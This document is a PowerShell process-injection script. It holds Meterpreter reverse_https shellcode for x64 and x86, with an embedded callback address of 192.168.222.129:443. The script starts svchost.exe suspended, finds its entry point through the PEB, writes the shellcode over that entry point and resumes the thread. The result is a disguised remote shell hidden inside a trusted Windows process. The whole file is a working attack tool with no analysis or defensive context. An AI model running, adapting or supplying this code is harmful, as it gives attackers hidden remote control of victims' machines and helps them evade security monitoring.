Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION
{
    public IntPtr hProcess;
    public IntPtr hThread;
    public uint dwProcessId;
    public uint dwThreadId;
}

[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
public struct STARTUPINFO
{
    public uint cb;
    public string lpReserved;
    public string lpDesktop;
    public string lpTitle;
    public uint dwX;
    public uint dwY;
    public uint dwXSize;
    public uint dwYSize;
    public uint dwXCountChars;
    public uint dwYCountChars;
    public uint dwFillAttribute;
    public STARTF dwFlags;
    public ShowWindow wShowWindow;
    public short cbReserved2;
    public IntPtr lpReserved2;
    public IntPtr hStdInput;
    public IntPtr hStdOutput;
    public IntPtr hStdError;
}

[StructLayout(LayoutKind.Sequential)]
public struct SECURITY_ATTRIBUTES
{
    public int length;
    public IntPtr lpSecurityDescriptor;
    public bool bInheritHandle;
}

[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_BASIC_INFORMATION
{
    public IntPtr Reserved1;
    public IntPtr PebAddress;
    public IntPtr Reserved2;
    public IntPtr Reserved3;
    public IntPtr UniquePid;
    public IntPtr MoreReserved;
}

[Flags]
public enum CreationFlags : int
{
    NONE = 0,
    DEBUG_PROCESS = 0x00000001,
    DEBUG_ONLY_THIS_PROCESS = 0x00000002,
    CREATE_SUSPENDED = 0x00000004,
    DETACHED_PROCESS = 0x00000008,
    CREATE_NEW_CONSOLE = 0x00000010,
    CREATE_NEW_PROCESS_GROUP = 0x00000200,
    CREATE_UNICODE_ENVIRONMENT = 0x00000400,
    CREATE_SEPARATE_WOW_VDM = 0x00000800,
    CREATE_SHARED_WOW_VDM = 0x00001000,
    CREATE_PROTECTED_PROCESS = 0x00040000,
    EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
    CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
    CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
    CREATE_DEFAULT_ERROR_MODE = 0x04000000,
    CREATE_NO_WINDOW = 0x08000000,
}

[Flags]
public enum STARTF : uint
{
    STARTF_USESHOWWINDOW = 0x00000001,
    STARTF_USESIZE = 0x00000002,
    STARTF_USEPOSITION = 0x00000004,
    STARTF_USECOUNTCHARS = 0x00000008,
    STARTF_USEFILLATTRIBUTE = 0x00000010,
    STARTF_RUNFULLSCREEN = 0x00000020,  // ignored for non-x86 platforms
    STARTF_FORCEONFEEDBACK = 0x00000040,
    STARTF_FORCEOFFFEEDBACK = 0x00000080,
    STARTF_USESTDHANDLES = 0x00000100,
}

public enum ShowWindow : short
{
    SW_HIDE = 0,
    SW_SHOWNORMAL = 1,
    SW_NORMAL = 1,
    SW_SHOWMINIMIZED = 2,
    SW_SHOWMAXIMIZED = 3,
    SW_MAXIMIZE = 3,
    SW_SHOWNOACTIVATE = 4,
    SW_SHOW = 5,
    SW_MINIMIZE = 6,
    SW_SHOWMINNOACTIVE = 7,
    SW_SHOWNA = 8,
    SW_RESTORE = 9,
    SW_SHOWDEFAULT = 10,
    SW_FORCEMINIMIZE = 11,
    SW_MAX = 11
}

public static class Kernel32
{
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CreateProcess(
        string lpApplicationName, 
        string lpCommandLine, 
        ref SECURITY_ATTRIBUTES lpProcessAttributes, 
        ref SECURITY_ATTRIBUTES lpThreadAttributes,
        bool bInheritHandles, 
        CreationFlags dwCreationFlags, 
        IntPtr lpEnvironment,
        string lpCurrentDirectory, 
        ref STARTUPINFO lpStartupInfo, 
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress, 
        [Out] byte[] lpBuffer,
        int dwSize,
        ref IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        Int32 nSize,
        out IntPtr lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint ResumeThread(IntPtr hThread);
}
public static class Ntdll
{
    [DllImport("ntdll.dll")]
    public static extern UInt32  ZwQueryInformationProcess(
        IntPtr hProcess, 
        int procInformationClass,
        ref PROCESS_BASIC_INFORMATION procInformation, 
        uint ProcInfoLen, ref uint retlen);
}
"@

# x64 Shellcode
# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.222.129 LPORT=443 EXITFUNC=thread -f ps1
[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x56,0x48,0xf,0xb7,0x4a,0x4a,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x66,0x81,0x78,0x18,0xb,0x2,0xf,0x85,0x72,0x0,0x0,0x0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x4d,0x31,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x41,0x58,0x48,0x1,0xd0,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,0x6e,0x65,0x74,0x0,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,0x7,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0x10,0x0,0x0,0x0,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x32,0x32,0x32,0x2e,0x31,0x32,0x39,0x0,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x1,0x0,0x0,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x3,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0xab,0x0,0x0,0x0,0x2f,0x33,0x49,0x37,0x7a,0x68,0x78,0x34,0x7a,0x50,0x41,0x47,0x43,0x36,0x49,0x50,0x71,0x34,0x44,0x35,0x58,0x7a,0x77,0x48,0x55,0x35,0x5f,0x64,0x6a,0x75,0x59,0x46,0x62,0x72,0x52,0x64,0x52,0x58,0x77,0x37,0x4f,0x61,0x4b,0x4a,0x34,0x55,0x70,0x51,0x44,0x2d,0x42,0x4c,0x56,0x58,0x66,0x70,0x52,0x55,0x5a,0x30,0x59,0x59,0x76,0x41,0x5f,0x33,0x4f,0x6d,0x2d,0x30,0x58,0x65,0x33,0x43,0x6e,0x79,0x41,0x72,0x64,0x36,0x4a,0x42,0x49,0x6e,0x4c,0x42,0x61,0x4a,0x79,0x47,0x66,0x4f,0x33,0x4f,0x63,0x4d,0x41,0x45,0x4b,0x79,0x36,0x52,0x34,0x37,0x48,0x4f,0x38,0x57,0x34,0x67,0x74,0x75,0x78,0x4c,0x65,0x61,0x58,0x5a,0x47,0x30,0x41,0x68,0x54,0x4a,0x35,0x31,0x58,0x65,0x70,0x4e,0x78,0x54,0x35,0x6d,0x30,0x48,0x79,0x56,0x41,0x6a,0x43,0x61,0x62,0x4d,0x38,0x4a,0x66,0x79,0x61,0x2d,0x6b,0x46,0x33,0x6a,0x49,0x6c,0x6f,0x63,0x47,0x61,0x65,0x69,0x30,0x30,0x51,0x72,0x7a,0x57,0x6e,0x69,0x0,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x0,0x32,0xa8,0x84,0x0,0x0,0x0,0x0,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0xa,0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x0,0x0,0x49,0x89,0xe0,0x6a,0x4,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x0,0x0,0x0,0x0,0xff,0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x0,0x0,0x49,0xba,0x44,0xf0,0x35,0xe0,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0xff,0xcf,0x74,0x2,0xeb,0xaa,0xe8,0x55,0x0,0x0,0x0,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x0,0x10,0x0,0x0,0x49,0xba,0x58,0xa4,0x53,0xe5,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x0,0x20,0x0,0x0,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x7,0x48,0x1,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x0,0x59,0xbb,0xe0,0x1d,0x2a,0xa,0x41,0x89,0xda,0xff,0xd5
$x64shellcode = $buf

# x86 Shellcode
# msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.222.129 LPORT=443 EXITFUNC=thread -f ps1
[Byte[]] $buf = 0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x89,0xe5,0x31,0xff,0xf,0xb7,0x4a,0x26,0x8b,0x72,0x28,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0x49,0x75,0xef,0x52,0x8b,0x52,0x10,0x57,0x8b,0x42,0x3c,0x1,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x1,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x1,0xd3,0x85,0xc9,0x74,0x3c,0x49,0x8b,0x34,0x8b,0x31,0xff,0x1,0xd6,0x31,0xc0,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf4,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,0x68,0x6e,0x65,0x74,0x0,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0xe8,0x78,0x0,0x0,0x0,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x4d,0x61,0x63,0x69,0x6e,0x74,0x6f,0x73,0x68,0x3b,0x20,0x49,0x6e,0x74,0x65,0x6c,0x20,0x4d,0x61,0x63,0x20,0x4f,0x53,0x20,0x58,0x20,0x31,0x32,0x5f,0x32,0x5f,0x31,0x29,0x20,0x41,0x70,0x70,0x6c,0x65,0x57,0x65,0x62,0x4b,0x69,0x74,0x2f,0x35,0x33,0x37,0x2e,0x33,0x36,0x20,0x28,0x4b,0x48,0x54,0x4d,0x4c,0x2c,0x20,0x6c,0x69,0x6b,0x65,0x20,0x47,0x65,0x63,0x6b,0x6f,0x29,0x20,0x43,0x68,0x72,0x6f,0x6d,0x65,0x2f,0x39,0x38,0x2e,0x30,0x2e,0x34,0x37,0x35,0x38,0x2e,0x38,0x31,0x20,0x53,0x61,0x66,0x61,0x72,0x69,0x2f,0x35,0x33,0x37,0x2e,0x33,0x36,0x0,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x3,0x53,0x53,0x68,0xbb,0x1,0x0,0x0,0xe8,0x5b,0x1,0x0,0x0,0x2f,0x6b,0x41,0x54,0x4a,0x5a,0x31,0x62,0x4b,0x45,0x46,0x32,0x48,0x63,0x49,0x5a,0x78,0x35,0x61,0x5a,0x54,0x42,0x51,0x6c,0x6b,0x62,0x42,0x6d,0x52,0x5a,0x30,0x66,0x44,0x72,0x7a,0x2d,0x41,0x38,0x6a,0x45,0x59,0x65,0x4c,0x31,0x55,0x4c,0x75,0x44,0x79,0x76,0x78,0x41,0x6e,0x39,0x55,0x71,0x55,0x7a,0x52,0x38,0x64,0x32,0x6d,0x54,0x76,0x39,0x49,0x36,0x32,0x4f,0x78,0x4b,0x63,0x47,0x5a,0x56,0x31,0x6f,0x6a,0x59,0x72,0x41,0x4f,0x44,0x6f,0x58,0x76,0x44,0x55,0x76,0x44,0x50,0x47,0x50,0x67,0x2d,0x67,0x7a,0x54,0x42,0x6f,0x53,0x49,0x5f,0x31,0x4e,0x77,0x65,0x4b,0x4b,0x69,0x46,0x71,0x61,0x63,0x75,0x69,0x70,0x52,0x4a,0x53,0x7a,0x41,0x51,0x77,0x4c,0x45,0x69,0x69,0x4d,0x76,0x49,0x36,0x4f,0x63,0x67,0x53,0x74,0x45,0x56,0x50,0x69,0x37,0x4b,0x68,0x49,0x58,0x58,0x48,0x44,0x55,0x56,0x4d,0x2d,0x48,0x70,0x4c,0x44,0x65,0x56,0x7a,0x4b,0x6e,0x42,0x6d,0x63,0x6c,0x6c,0x41,0x51,0x49,0x75,0x49,0x4c,0x5a,0x64,0x50,0x41,0x42,0x73,0x5a,0x41,0x62,0x6e,0x6b,0x6c,0x67,0x45,0x6a,0x72,0x63,0x43,0x47,0x44,0x4a,0x6e,0x56,0x68,0x58,0x55,0x6d,0x36,0x4a,0x0,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x0,0x32,0xe8,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0xa,0x5f,0x68,0x80,0x33,0x0,0x0,0x89,0xe0,0x6a,0x4,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x14,0x68,0x88,0x13,0x0,0x0,0x68,0x44,0xf0,0x35,0xe0,0xff,0xd5,0x4f,0x75,0xcd,0xe8,0x4c,0x0,0x0,0x0,0x6a,0x40,0x68,0x0,0x10,0x0,0x0,0x68,0x0,0x0,0x40,0x0,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x0,0x20,0x0,0x0,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x7,0x1,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x6b,0xff,0xff,0xff,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x32,0x32,0x32,0x2e,0x31,0x32,0x39,0x0,0xbb,0xe0,0x1d,0x2a,0xa,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x53,0xff,0xd5
$x86shellcode = $buf

$target = "c:\windows\system32\svchost.exe"

$Is64BitProcess = $false
if ([System.Environment]::Is64BitProcess){
    $Is64BitProcess = $true
}

$si = New-Object STARTUPINFO
$pi = New-Object PROCESS_INFORMATION

$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
$si.wShowWindow = [ShowWindow]::SW_SHOW

$pSec = New-Object SECURITY_ATTRIBUTES
$tSec = New-Object SECURITY_ATTRIBUTES
$pSec.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($pSec)
$tSec.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($tSec)

# Creates the target process in suspended state.
# 0x04 = CREATE_SUSPENDED
if([Kernel32]::CreateProcess($target, $null, [ref] $pSec, [ref] $tSec, $false, 0x4, [IntPtr]::Zero, "c:", [ref] $si, [ref] $pi)){
    $procId = $pi.dwProcessId
    Write-Output "[+] Process $target started with PID $procId"
}else{
    Write-Output "[-] Failed to start $target"
    Exit
}

$bi = New-Object PROCESS_BASIC_INFORMATION
$tmp = 0
$hProcess = $pi.hProcess

# Get information about the process and identify the PEB address
[Ntdll]::ZwQueryInformationProcess($hProcess, 0, [Ref]$bi, [System.Runtime.InteropServices.Marshal]::SizeOf($bi) ,[Ref]$tmp)|Out-Null
if($Is64BitProcess){
    # 64bit process
    $ptrToImageBase = [IntPtr]([Int64]$bi.PebAddress + 0x10) # PebAddress + 16
}else{
    # 32bit process
    $ptrToImageBase = [IntPtr]([Int32]$bi.PebAddress + 0x08) # PebAddress + 8
}
Write-Output "[+] ImageBase = $ptrToImageBase"

$addrbuf = [System.Byte[]]::CreateInstance([System.Byte],[Intptr]::Size)
$nRead = [IntPtr]::Zero;
if([Kernel32]::ReadProcessMemory($hProcess, $ptrToImageBase, $addrbuf, $addrbuf.length, [Ref]$nRead)){
    if($Is64BitProcess){
        # 64bit process
        $svchostBase = [IntPtr]([bitconverter]::ToInt64($addrbuf, 0))
    }else{
        # 32bit process
        $svchostBase = [IntPtr]([bitconverter]::ToInt32($addrbuf, 0))
    }
    Write-Output "[+] SvcHostBase = $svchostBase"
}else{
    Write-Output "[-] Failed to call ReadProcessMemory"
    Exit
}

$data = [System.Byte[]]::CreateInstance([System.Byte],0x200)
if([Kernel32]::ReadProcessMemory($hProcess, $svchostBase, $data, $data.Length, [Ref]$nRead)){
    $e_lfanew_offset = [bitconverter]::ToInt32($data, 0x3C)
    $opthdr = $e_lfanew_offset + 0x28;
    $entrypoint_rva = [bitConverter]::ToUInt32($data, [Int]$opthdr)
    if($Is64BitProcess){
        # 64bit process
        $addressOfEntryPoint = [IntPtr]([Int64]([UInt64]$svchostBase.ToInt64() + $entrypoint_rva))
    }else{
        # 32bit process
        $addressOfEntryPoint = [IntPtr]([Int32]([UInt32]$svchostBase.ToInt32() + $entrypoint_rva))
    }
    Write-Output "[+] EntryPoint = $addressOfEntryPoint"
}else{
    Write-Output "[-] Failed to call ReadProcessMemory"
    Exit
}

# Write Shellcode
if($Is64BitProcess){
    # 64bit process
    [Kernel32]::WriteProcessMemory($hProcess,$addressOfEntryPoint,$x64shellcode,$x64shellcode.Length, [Ref][IntPtr]::Zero)|Out-Null
}else{
    # 32bit process
    [Kernel32]::WriteProcessMemory($hProcess,$addressOfEntryPoint,$x86shellcode,$x86shellcode.Length, [Ref][IntPtr]::Zero)|Out-Null
}

if([Kernel32]::ResumeThread($pi.hThread)){
    Write-Output "[+] Process has been resumed!"
}
